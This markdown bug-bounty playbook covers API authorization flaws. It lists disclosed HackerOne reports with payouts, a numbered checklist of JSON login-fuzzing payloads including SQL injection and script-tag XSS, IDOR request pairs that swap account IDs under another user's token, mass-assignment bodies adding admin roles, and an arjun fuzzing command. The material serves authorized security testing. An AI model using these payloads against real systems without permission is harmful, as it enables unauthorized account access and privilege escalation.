# Real-World Playbook — API Auth (BOLA/BFLA/BOPLA/Mass-Assignment)

**Class:** `api-auth` · **Coverage-matrix tier:** 0 · **Hunter2:** /api-audit · tools/api_security_scanner.py · tools/apispec_idor.py · **Skill:** api-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)

## Why it pays (real bounty signal)
Top disclosed API Auth reports peak at **$39,999**. Rewarded across: AMBER AI, Aiven Ltd, GitHub, GitLab, Grab, HackerOne, Internet Bug Bounty, LY Corporation.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **[Pre-Submission][H1-4420-2019] API access to Phabricator on code.uberinternal.com from leaked certificate in git repo** — Uber, $39,999 · 448👍 · [591813](https://hackerone.com/reports/591813)
- **Exposed Kubernetes API - RCE/Exposed Creds** — Snapchat, $25,000 · 1187👍 · [455645](https://hackerone.com/reports/455645)
- **DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API** — HackerOne, $12,500 · 175👍 · [3287208](https://hackerone.com/reports/3287208)
- **Git flag injection - Search API with scope 'blobs'** — GitLab, $7,000 · 130👍 · [682442](https://hackerone.com/reports/682442)
- **Exposed Cortex API at https://cortex-ingest.shopifycloud.com/** — Shopify, $6,300 · 99👍 · [1258871](https://hackerone.com/reports/1258871)
- **Blind SSRF to internal services in matrix preview_link API** — Reddit, $6,000 · 341👍 · [1960765](https://hackerone.com/reports/1960765)
- **Apache Flink RCE via GET jar/plan API Endpoint** — Aiven Ltd, $6,000 · 131👍 · [1418891](https://hackerone.com/reports/1418891)
- **DoS via markdown API from unauthenticated user** — GitHub, $4,000 · 54👍 · [1619604](https://hackerone.com/reports/1619604)
- **Leak ██████████ information in real time through API request** — Grab, $3,000 · 103👍 · [307050](https://hackerone.com/reports/307050)
- **Missing authentication in buddy group API of LINE TIMELINE** — LY Corporation, $3,000 · 47👍 · [1283938](https://hackerone.com/reports/1283938)
- **Stored XSS on PyPi simple API endpoint** — GitLab, $3,000 · 25👍 · [856836](https://hackerone.com/reports/856836)
- **Near to Infinite loop when changing Group's name that has API token as Team Member** — HackerOne, $2,500 · 77👍 · [880187](https://hackerone.com/reports/880187)
- **Authenticated but unauthorized users may enumerate Application names via the API** — Internet Bug Bounty, $2,400 · 11👍 · [1916583](https://hackerone.com/reports/1916583)
- **Undocumented `fileCopy` GraphQL API** — Shopify, $2,000 · 157👍 · [981472](https://hackerone.com/reports/981472)
- **Выполнение API-методов при открытии сообщества/приложения** — VK.com, $2,000 · 43👍 · [1354452](https://hackerone.com/reports/1354452)
- **Ability to view monitor names of other NR accounts through internal API (v3) via "monitor_id" parameter** — New Relic, $2,000 · 8👍 · [462321](https://hackerone.com/reports/462321)
- **Full access to InDrive jira panel via exposed API token** — inDrive, $1,500 · 125👍 · [1785145](https://hackerone.com/reports/1785145)
- **Support Portal Takeover via Leaked API KEY** — AMBER AI, $1,500 · 90👍 · [1766228](https://hackerone.com/reports/1766228)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

97 JSON Tests for for Authentication Endpoints link pdf [link](https://www.linkedin.com/feed/update/urn:li:activity:7097279293608607746/)

1. Basic credentials
```
{
"login": "admin",
"password": "admin"
}
```

2. Empty credentials:
```
{
"login": "",
"password": ""
}
```

3- Null values:
```
{
"login": null,
"password": null
}
```

4. Credentials as numbers:
```
{
"login": 123,
"password": 456
}
```

6. Credentials as booleans:
```
{
"login": true,
"password": false
}
```

7. Credentials as arrays:
```
{
"login": ["admin"],
"password": ["password"]
}
```

8. Credentials as objects:
```
{
"login": {"username": "admin",
"password": {"password": "password"}}
}
```

9. Special characters in credentials:
```
{
"login": "@dm!n",
"password": "p@ssw0rd#"
}
```

10. SQL Injection:
```
{
"login": "admin' --",
"password": "password"
}
```

11. HTML tags in credentials:
```
{
"login": "<h1>admin</h1>",
"password": "ololo-HTML-XSS"
}
```

12. Unicode in credentials:
```
{
"login": "\u0061\u0064\u006D\u0069\u006E",
"password":"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064"
}
```

13. Credentials with escape characters:
```
{
"login": "ad\\nmin",
"password": "pa\\ssword"
}
```

14. Credentials with white space:
```
{
"login": " ",
"password": " "
}
```

15. Overlong values:
```
{
"login": "a"*10000,
"password": "b"*10000
}

```
16. Malformed JSON (missing brace):
```
{
"login": "admin",
"password": "admin"
}
```

17. Malformed JSON (extra comma):
```
{
"login": "admin",
"password": "admin",
}
```

18. Missing login key:
```
{
"password": "admin"
}
```

19. Missing password key:
```
{
"login": "admin"
}
```

20. Swapped key values:
```
{
"admin": "login",
"password": "password"
}
```

21. Extra keys:
```
{
"login": "admin",
"password": "admin",
"extra": "extra"
}
```

22. Missing colon:
```
{
"login" "admin",
"password": "password"
}
```

23. Invalid Boolean as credentials:
```
{
"login": yes,
"password": no
}
```

25. All keys, no values:
```
{
"": "",
"": ""
}
```

26. Nested objects:
```
{
"login": {"innerLogin": "admin",
"password": {"innerPassword": "password"}}
}
```
27. Case sensitivity testing:
```
{
"LOGIN": "admin",
"PASSWORD": "password"
}
```

28. Login as a number, password as a string:
```
{
"login": 1234,
"password": "password"
}
```

29. Login as a string, password as a number:
```
{
"login": "admin",
"password": 1234
}
```

30. Repeated keys:
```
{
"login": "admin",
"login": "user",
"password": "password"
}
```
31. Single quotes instead of double:
```
{
'login': 'admin',
'password': 'password'
}
```
33. Login and password with only special characters:
```
{
"login": "@#$%^&*",
"password": "!@#$%^&*"
}
```
34. Unicode escape sequence:
```
{
"login": "\u0041\u0044\u004D\u0049\u004E",
"password":"\u0050\u0041\u0053\u0053\u0057\u004F\u0052\u0044"
}
```

35. Value as object instead of string:
```
{
"login": {"$oid":
"507c7f79bcf86cd7994f6c0e"},
"password": "password"}
}
```

37. Nonexistent variables as values:
```
{
"login": undefined,
"password": undefined
}
```

38. Extra nested objects:
```
{
"login": "admin",
"password": "password",
"extra": {"key1": "value1",
"key2": "value2"}
}

```

39. Hexadecimal values:
```
{
"login": "0x1234",
"password": "0x5678"
}
```

40. Extra symbols after valid JSON:
```
{
"login": "admin",
"password": "password"}@@@@@@
}
```

41. Only keys, without values:
```
{
"login":,
"password":
}
```

42. Insertion of control characters:
```
{
"login": "ad\u0000min",
"password": "pass\u0000word"
}
```

43. Long Unicode Strings:
```
{
"login": "\u0061"*10000,
"password": "\u0061"*10000
}
```

44. Newline Characters in Strings:
```
{
"login": "ad\nmin",
"password": "pa\nssword"
}
```

45. Tab Characters in Strings:
```
{
"login": "ad\tmin",
"password": "pa\tssword"
}
```

46. Test with HTML content in Strings:
```
{
"login": "<b>admin",
"password": "password"
}
```

47. JSON Injection in Strings:
```
{
"login": "{\"injection\":\"value\"}",
"password": "password"
}
```

48. Test with XML content in Strings:
```
{
"login": "admin",
"password": "password"
}
```

49. Combination of Number, Strings, and Special characters:
```
{
"login": "ad123min!@",
"password": "pa55w0rd!@"
}
```

50. Use of environment variables:
```
{
"login": "${USER}",
"password": "${PASS}"
}
```

51. Backslashes in Strings:
```
{
"login": "ad\\min",
"password": "pa\\ssword"
}
```

52. Long strings of special characters:
```
{
"login": "!@#$%^&*()"*1000,
"password": "!@#$%^&*()"*1000
}
```

53. Empty Key in JSON:
```
{
"": "admin",
"password": "password"
}
```

55. JSON Injection in Key:
```
{
"{\"injection\":\"value\"}
": "admin",
"password": "password"
}
```

56. Quotation marks in strings:
```
{
"login": "\"admin\"",
"password": "\"password\""
}
```

57. Credentials as nested arrays:
```
{
"login": [["admin"]],
"password": [["password"]]
}
```

58. Credentials as nested objects:
```
{
"login": {"username": {"value": "admin",
"password": {"password": {"value":
"password"
}
```

59. Keys as numbers:
```
{
123: "admin",
456: "password"
}
```

60. Testing with greater than and less than signs:
```
{
"login": "admin>1",
"password": "<password"
}
```

61. Testing with parentheses in credentials:
```
{
"login": "(admin)",
"password": "(password)"
}
```

62. Credentials containing slashes:
```
{
"login": "admin/user",
"password": "pass/word"
}
```

63. Credentials containing multiple data types:
```
{
"login": ["admin",
123,
true,
null,
{"username": ["admin"],
"password": ["password",
123,
false,
null,
{"password": "password"]}}
}
```

64. Using escape sequences:
```
{
"login": "admin\\r\\n\\t",
"password": "password\\r\\n\\t"
}
```

65. Using curly braces in strings:
```
{
"login": "{admin}",
"password": "{password}"
}
```

66. Using square brackets in strings:
```
{
"login": "[admin]",
"password": "[password]"
}
```

68. Strings with only special characters:
```
{
"login": "!@#$$%^&*()",
"password": "!@#$$%^&*()"
}
```

69. Strings with control characters:
```
{
"login": "admin\b\f\n\r\t\v\0",
"password": "password\b\f\n\r\t\v\0"
}
```

71. Null characters in strings:
```
{
"login": "admin\0",
"password": "password\0"
}
```

72. Exponential numbers as strings:
```
{
"login": "1e5",
"password": "1e10"
}
```

73. Hexadecimal numbers as strings:
```
{
"login": "0xabc",
"password": "0x123"
}
```

74. Leading zeros in numeric strings:
```
{
"login": "000123",
"password": "000456"
}
```

75. Multilingual input (here, English and Korean):
```
{
"login": "adminê´€ë¦¬ìž",
"password": "passwordë¹„ë°€ë²ˆí˜¸"
}
```
76. Extremely long keys:
```
{
"a"*10000: "admin",
"b"*10000: "password"
}
```

78. Extremely long unicode strings:
```
{
"login": "\u0061"*10000,
"password": "\u0062"*10000
}
```

79. JSON strings with semicolon:
```
{
"login": "admin;",
"password": "password;"
}
```

80. JSON strings with backticks:
```
{
"login": "`admin`",
"password": "`password`"
}
```

81. JSON strings with plus sign:
```
{
"login": "admin+",
"password": "password+"
}
```

82. JSON strings with equal sign:
```
{
"login": "admin=",
"password": "password="
}
```
83. Strings with Asterisk (*) Symbol:
```
{
"login": "admin*",
"password": "password*"
}
```

84. JSON containing JavaScript code:
```
{
"login": "admin<script>alert('hi')</script>",
"password": "password"
}
```

85. Negative numbers as strings:
```
{
"login": "-123",
"password": "-456"
}
```

86. Values as URLs:
```
{
"login": "https://admin.com",
"password": "https://password.com"
}
```

87. Strings with email format:
```
{
"login": "admin@admin.com",
"password": "password@password.com"
}
```
88. Strings with IP address format:
```
{
"login": "192.0.2.0",
"password": "203.0.113.0"
}
```

89. Strings with date format:
```
{
"login": "2023-08-03",
"password": "2023-08-04"
}
```

90. JSON with exponential values:
```
{
"login": 1e+30,
"password": 1e+30
}
```

91. JSON with negative exponential values:
```
{
"login": -1e+30,
"password": -1e+30
}
```

92. Using Zero Width Space (U+200B) in strings:
```
{
"login": "adminâ€‹",
"password": "passwordâ€‹"
}
```

93. Using Zero Width Joiner (U+200D) in strings:
```
{
"login": "adminâ€",
"password": "passwordâ€"
}
```

94. JSON with extremely large numbers:
```
{
"login": 12345678901234567890,
"password": 12345678901234567890
}
```

95. Strings with backspace characters:
```
{
"login": "admin\b",
"password": "password\b"
}
```

96. Test with emoji in strings:
```
{
"login": "adminðŸ˜€",
"password": "passwordðŸ˜€"
}
```

97. JSON with comments, although they are not officially supported in JSON:
```
{
/*"login": "admin",
"password": "password"*/
}
```

98. JSON with base64 encoded values:
```
{
"login": "YWRtaW4=",
"password": "cGFzc3dvcmQ="
}
```

99. Including null byte character (may cause truncation):
```
{
"login": "admin\0",
"password": "password\0"
}
```

100. JSON with credentials in scientific notation:
```
{
"login": 1e100,
"password": 1e100
}
```

102. Strings with octal values:
```
{
"login": "\141\144\155\151\156",
"password":"\160\141\163\163\167\157\162\144"
}
```
103. writeup
```
{
root:{
"username": "admin",
"password":"admin"
}
}
```

104. writeup
```
basic => username=admin
username[]=admin
username[0]=admin
username=admin&username=admin
delete username=admin

```

**Predictable ID**
```bash
GET /api/v1/account/**2222** 
Token: UserA_token

GET /api/v1/account/**3333** 
Token: UserA_token
```

**ID combo**
```bash
GET /api/v1/**UserA**/data/2222 
Token: UserA_token

GET /api/v1/**UserB**/data/3333 
Token: UserA_token
```

**Integer as ID**
```bash
POST /api/v1/account/ 
Token: UserA_token 
{"Account": 2222 }


POST /api/v1/account/ 
Token: UserA_token 
{"Account": [3333]}
```

**Email as user ID**
```bash
POST /api/v1/user/account 
Token: UserA_token 
{"email": " UserA@email.com"}


POST /api/v1/user/account 
Token: UserA_token 
{"email": " UserB@email.com"}
```

**Group ID**
```bash
GET /api/v1/group/CompanyA 
Token: UserA_token

GET /api/v1/group/CompanyB
Token: UserA_token
```

**Group and user combo**
```bash
POST /api/v1/group/CompanyA 
Token: UserA_token 
{"email": " userA@CompanyA .com"}

POST /api/v1/group/CompanyB 
Token: UserA_token 
{"email": " userB@CompanyB .com"}
```

**Nested object**
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": {"Account" :3333}}
```

**Multiple objects**
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222, "Account": 3333, "Account": 5555 }
```

**Predictable token**
```bash
POST /api/v1/user/account 
Token: UserA_token 
{"data": "DflK1df7jSdfa1acaa"}

POST /api/v1/user/account
Token: UserA_token 
{"data": "DflK1df7jSdfa2dfaa"}
```

10-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0d%0a1111 }
```

11-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0a1111 }
```

12-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0d1111 }
```

13-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%001111 }
```

14-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": [2222,1111] }
```


15-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222;1111 }
```


16-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222,1111 }
```

17-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222|1111 }
```

18-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0a%0dcc:1111 }
```

19-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222&1111 }
```

20-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222#%1111 }
```

**Try This Vulnerability in**
```
Account Registration
Unauthorized Access to Organizations
reset password 
login
change email
change username
```
**Account Registration**
the basic request
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"password":"Password1!"
}
```

try
1-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": true,
"password":"Password1!"
}
```
2-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ADMIN": true,
"password":"Password1!"
}
```

3-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"isadmin": true,
"password":"Password1!"
}
```

4-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ISADMIN": true,
"password":"Password1!"
}
```

5-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"Admin": true,
"password":"Password1!"
}
```

6- 
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": admin,
"password":"Password1!"
}
```

7- 
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": ADMIN,
"password":"Password1!"
}
```

8-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": administrator,
"password":"Password1!"
}
```

9-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": administrator,
"password":"Password1!"
}
```

10-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": admin,
"password":"Password1!"
}
```

11-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": 1,
"password":"Password1!"
}
```

**Unauthorized Access to Organizations**
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"org": "§CompanyA§",
"password":"Password1!"
}
```

**Finding Variables in Documentation**
```
by reading the document you can find variable
```

**Fuzzing Unknown Variables**
```
Another common scenario is that you’ll perform an action in a web application, intercept the request, and locate several bonus headers or parameters 
within it, like so:

POST /create/user
--snip--
{
"username": "hapi_hacker"
"pass": "ff7ftw",
"uam": 1,
"mfa": true,
"account": 101
}
```

Automating Mass Assignment Attacks with Arjun and burp Suite Intruder
```
 arjun --headers "Content-Type: application/json]" -u http://vulnhost.com/api/register -m JSON --include='{$arjun$}'
```

## Chaining — always ask "what does this unlock?"
- BFLA: call admin function as low-priv user → privilege escalation
- Mass assignment: add role=admin / is_verified=true in JSON body → privesc
- BOPLA: read/write a property you shouldn't (returned but hidden in UI)
- Old API version (v1 vs v2) missing the auth check → BOLA

## Hunter2 wiring
- **Run:** `/api-audit · tools/api_security_scanner.py · tools/apispec_idor.py`
- **Skill:** `api-security`
- **Coverage-matrix tier:** 0 (Tier 0 = test first)
